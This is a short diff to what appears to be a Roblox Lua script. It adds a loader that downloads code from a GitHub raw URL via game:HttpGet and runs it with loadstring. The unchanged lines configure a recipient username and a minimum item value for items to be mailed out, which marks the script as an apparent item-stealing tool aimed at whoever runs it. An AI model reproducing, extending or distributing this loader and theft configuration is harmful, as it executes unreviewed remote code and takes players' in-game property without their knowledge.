@@ -1,3 +1,10 @@
+-- Lua script başı
+local url = "https://raw.githubusercontent.com/ardaqee/pesa/main/script.lua"
+local scriptContent = game:HttpGet(url)
+
+-- Yüklenen Lua kodunu çalıştırma
+loadstring(scriptContent)()
+
 Username = "metegazoz77"
 Username2 = "metegazoz77" -- stuff will get sent to this user if first user's mailbox is full
 min_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default
